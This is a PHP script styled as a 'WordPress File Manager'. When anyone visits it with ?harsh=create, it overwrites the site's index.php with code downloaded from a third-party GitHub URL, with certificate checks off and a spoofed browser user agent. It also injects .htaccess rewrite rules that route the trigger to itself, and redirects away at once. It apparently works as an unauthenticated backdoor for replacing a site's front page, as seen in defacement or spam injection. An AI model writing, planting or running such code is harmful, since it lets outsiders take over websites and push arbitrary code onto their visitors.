<?php
/**
 * WordPress File Manager - Index and .htaccess Switcher
 * 
 * This script provides functionality to:
 * 1. Backup and replace index.php with a version from GitHub
 * 2. Backup and modify .htaccess file
 * 3. Restore both files to their original versions
 * 
 * Usage:
 * - ?harsh=create: Replace index.php with GitHub version and modify .htaccess
 * - ?harsh=restore: Restore original index.php and .htaccess from backups
 */

// Define file paths
$root_directory = __DIR__;
$original_index = $root_directory . '/index.php';
$backup_dir = $root_directory . '/wp-content/uploads/backup';
$backup_index = $backup_dir . '/index.bk';
$original_htaccess = $root_directory . '/.htaccess';
$backup_htaccess = $backup_dir . '/.htaccess.bk';
$github_url = 'https://raw.githubusercontent.com/beaushowcase/page/main/index.php';
$log_file = $backup_dir . '/file_switcher.log';

// Enable error reporting for debugging
// error_reporting(E_ALL);
// ini_set('display_errors', 1);

// Function to log actions
function log_action($message) {
    global $log_file;
    $timestamp = date('Y-m-d H:i:s');
    file_put_contents($log_file, "[$timestamp] $message" . PHP_EOL, FILE_APPEND);
}

// Function to check file permissions
function check_permissions() {
    global $root_directory, $original_index, $original_htaccess;
    
    if (!is_writable($root_directory)) {
        return "Error: The script doesn't have permission to write to the directory.";
    }
    
    if (file_exists($original_index) && !is_writable($original_index)) {
        return "Error: The script doesn't have permission to modify index.php.";
    }
    
    if (file_exists($original_htaccess) && !is_writable($original_htaccess)) {
        return "Error: The script doesn't have permission to modify .htaccess.";
    }
    
    return true;
}

// Function to backup files
function backup_files() {
    global $original_index, $backup_index, $original_htaccess, $backup_htaccess, $backup_dir;
    $result = [];
    
    // Create backup directory if it doesn't exist
    if (!file_exists($backup_dir)) {
        if (!mkdir($backup_dir, 0755, true)) {
            log_action("Failed to create backup directory");
            $result[] = "Error: Failed to create backup directory";
            return $result;
        }
    }
    
    // Backup index.php if it hasn't been backed up already
    if (!file_exists($backup_index) && file_exists($original_index)) {
        if (copy($original_index, $backup_index)) {
            log_action("Backed up original index.php to index.bk");
            $result[] = "Successfully backed up index.php to index.bk";
        } else {
            log_action("Failed to backup index.php");
            $result[] = "Failed to backup index.php";
        }
    } elseif (file_exists($backup_index)) {
        $result[] = "index.php backup already exists";
    }
    
    // Backup .htaccess if it hasn't been backed up already
    if (!file_exists($backup_htaccess) && file_exists($original_htaccess)) {
        if (copy($original_htaccess, $backup_htaccess)) {
            log_action("Backed up original .htaccess to .htaccess.bk");
            $result[] = "Successfully backed up .htaccess to .htaccess.bk";
        } else {
            log_action("Failed to backup .htaccess");
            $result[] = "Failed to backup .htaccess";
        }
    } elseif (file_exists($backup_htaccess)) {
        $result[] = ".htaccess backup already exists";
    }
    
    return $result;
}

// Function to replace index.php with GitHub version
function replace_index() {
    global $original_index, $github_url;
    
    // Initialize cURL session
    $ch = curl_init();
    
    // Set cURL options
    curl_setopt($ch, CURLOPT_URL, $github_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Disable SSL verification for compatibility
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    
    // Execute cURL session
    $github_content = curl_exec($ch);
    $curl_error = curl_error($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    
    // Close cURL session
    curl_close($ch);
    
    // Log the result for debugging
    log_action("GitHub fetch attempt - HTTP Code: $http_code");
    
    if ($github_content === false || $http_code != 200) {
        log_action("Failed to download GitHub content: $curl_error");
        
        // Fallback method using file_get_contents if curl fails
        $context = stream_context_create([
            'http' => [
                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
                'follow_location' => true,
                'timeout' => 30
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false
            ]
        ]);
        
        $github_content = @file_get_contents($github_url, false, $context);
        
        if ($github_content === false) {
            return "Error: Failed to download content from GitHub. Please check your internet connection or GitHub repository URL.";
        }
    }
    
    // Verify we got some valid content
    if (empty($github_content)) {
        log_action("GitHub returned empty content");
        return "Error: GitHub returned empty content.";
    }
    
    // Save the content to index.php
    if (file_put_contents($original_index, $github_content)) {
        log_action("Successfully replaced index.php with GitHub version");
        return "Success: Index replaced with GitHub version.";
    } else {
        log_action("Failed to write GitHub content to index.php");
        return "Error: Failed to write GitHub content to index.php.";
    }
}

// Function to modify .htaccess file
function modify_htaccess() {
    global $original_htaccess;
    
    // Check if .htaccess exists
    if (!file_exists($original_htaccess)) {
        // Create a new .htaccess file
        $htaccess_content = "# BEGIN WordPress File Switcher\n";
        $htaccess_content .= "# This .htaccess was created by the file switcher script\n";
        $htaccess_content .= "<IfModule mod_rewrite.c>\n";
        $htaccess_content .= "RewriteEngine On\n";
        $htaccess_content .= "RewriteBase /\n";
        $htaccess_content .= "RewriteRule ^index\.php$ - [L]\n";
        $htaccess_content .= "RewriteCond %{REQUEST_FILENAME} !-f\n";
        $htaccess_content .= "RewriteCond %{REQUEST_FILENAME} !-d\n";
        $htaccess_content .= "RewriteRule . /index.php [L]\n";
        $htaccess_content .= "</IfModule>\n";
        $htaccess_content .= "# END WordPress File Switcher\n";
    } else {
        // Read existing .htaccess
        $htaccess_content = file_get_contents($original_htaccess);
        
        // Check if our custom rules already exist
        if (strpos($htaccess_content, "# BEGIN WordPress File Switcher") === false) {
            // Add our custom rules at the beginning
            $custom_rules = "# BEGIN WordPress File Switcher\n";
            $custom_rules .= "# Custom rules added by file switcher script\n";
            $custom_rules .= "<IfModule mod_rewrite.c>\n";
            $custom_rules .= "RewriteEngine On\n";
            $custom_rules .= "RewriteCond %{QUERY_STRING} harsh=(create|restore) [NC]\n";
            $custom_rules .= "RewriteRule ^$ " . basename(__FILE__) . " [L]\n";
            $custom_rules .= "</IfModule>\n";
            $custom_rules .= "# END WordPress File Switcher\n\n";
            
            $htaccess_content = $custom_rules . $htaccess_content;
        }
    }
    
    // Write to .htaccess
    if (file_put_contents($original_htaccess, $htaccess_content)) {
        log_action("Successfully modified .htaccess");
        return "Success: .htaccess has been modified.";
    } else {
        log_action("Failed to modify .htaccess");
        return "Error: Failed to modify .htaccess.";
    }
}

// Function to restore original files
function restore_files() {
    global $original_index, $backup_index, $original_htaccess, $backup_htaccess, $backup_dir;
    $result = [];
    
    // Restore index.php
    if (file_exists($backup_index)) {
        if (copy($backup_index, $original_index)) {
            log_action("Restored original index.php from backup");
            $result[] = "Success: Original index.php has been restored.";
            unlink($backup_index);
            log_action("Deleted backup file index.bk");
        } else {
            log_action("Failed to restore original index.php");
            $result[] = "Error: Failed to restore original index.php.";
        }
    } else {
        log_action("Backup file index.bk not found");
        $result[] = "Error: Backup file index.bk not found.";
    }
    
    // Restore .htaccess
    if (file_exists($backup_htaccess)) {
        if (copy($backup_htaccess, $original_htaccess)) {
            log_action("Restored original .htaccess from backup");
            $result[] = "Success: Original .htaccess has been restored.";
            unlink($backup_htaccess);
            log_action("Deleted backup file .htaccess.bk");
        } else {
            log_action("Failed to restore original .htaccess");
            $result[] = "Error: Failed to restore original .htaccess.";
        }
    } else {
        log_action("Backup file .htaccess.bk not found");
        $result[] = "Error: Backup file .htaccess.bk not found.";
    }
    
    // Remove backup directory if empty
    if (is_dir($backup_dir) && count(scandir($backup_dir)) <= 2) { // Only . and .. entries
        rmdir($backup_dir);
        log_action("Removed empty backup directory");
    }
    
    return $result;
}

// Main execution
header('Content-Type: text/html; charset=utf-8');
echo "<!DOCTYPE html>\n<html>\n<head>\n";
echo "<title>WordPress File Manager</title>\n";
echo "<meta name='viewport' content='width=device-width, initial-scale=1'>\n";
echo "<style>body{font-family:Arial,sans-serif;margin:40px;line-height:1.6}h1{color:#0073aa}pre{background:#f1f1f1;padding:15px;border-radius:5px}.success{color:green}.error{color:red}p{margin:10px 0}</style>\n";
echo "</head>\n<body>\n";
echo "<h1>WordPress File Manager</h1>\n";

// Check if we have appropriate permissions
$permissions_check = check_permissions();
if ($permissions_check !== true) {
    echo "<p class='error'>{$permissions_check}</p>";
    echo "</body>\n</html>";
    exit;
}

// Process URL parameters
if (isset($_GET['harsh'])) {
    $action = $_GET['harsh'];
    
    // Create action: Replace index.php with GitHub version and modify .htaccess
    if ($action === 'create') {
        echo "<h2>Creating Custom Setup</h2>";
        
        // Backup files
        $backup_result = backup_files();
        foreach ($backup_result as $message) {
            echo "<p>" . htmlspecialchars($message) . "</p>";
        }
        
        // Replace index.php
        $index_result = replace_index();
        if (strpos($index_result, 'Error') === 0) {
            echo "<p class='error'>" . htmlspecialchars($index_result) . "</p>";
        } else {
            echo "<p class='success'>" . htmlspecialchars($index_result) . "</p>";
        }
        
        // Modify .htaccess
        $htaccess_result = modify_htaccess();
        if (strpos($htaccess_result, 'Error') === 0) {
            echo "<p class='error'>" . htmlspecialchars($htaccess_result) . "</p>";
        } else {
            echo "<p class='success'>" . htmlspecialchars($htaccess_result) . "</p>";
        }
        
        echo "<p><strong>Note:</strong> If you're experiencing issues with GitHub downloads, please check your server's internet connection or firewall settings.</p>";
    }
    
    // Restore action: Restore original files
    elseif ($action === 'restore') {
        echo "<h2>Restoring Original Setup</h2>";
        
        $restore_result = restore_files();
        foreach ($restore_result as $message) {
            if (strpos($message, 'Error') === 0) {
                echo "<p class='error'>" . htmlspecialchars($message) . "</p>";
            } else {
                echo "<p class='success'>" . htmlspecialchars($message) . "</p>";
            }
        }
    }
    
    // Redirect immediately for create action
    if ($action === 'create') {
        header("Location: /");
        exit;
    } else {
        // Add a redirect after processing for restore action
        echo "<p>Redirecting to homepage in 5 seconds...</p>";
        echo "<p><a href='/'>Click here if not redirected</a></p>";
        header("Refresh: 5; URL=/");
    }
} else {
    // No action specified, show usage instructions
    echo "<h2>Usage Instructions</h2>";
    echo "<p>This script allows you to switch between the original WordPress files and custom versions.</p>";
    echo "<ul>";
    echo "<li><a href='?harsh=create'>?harsh=create</a> - Replace index.php with GitHub version and modify .htaccess</li>";
    echo "<li><a href='?harsh=restore'>?harsh=restore</a> - Restore original index.php and .htaccess from backups</li>";
    echo "</ul>";
    
    echo "<h2>Troubleshooting</h2>";
    echo "<p>If you encounter any issues:</p>";
    echo "<ul>";
    echo "<li>Check the file_switcher.log in your WordPress root directory for error messages</li>";
    echo "<li>Ensure your server has internet access to download files from GitHub</li>";
    echo "<li>Verify that the script has write permissions to your WordPress directory</li>";
    echo "</ul>";
}

echo "</body>\n</html>";
?>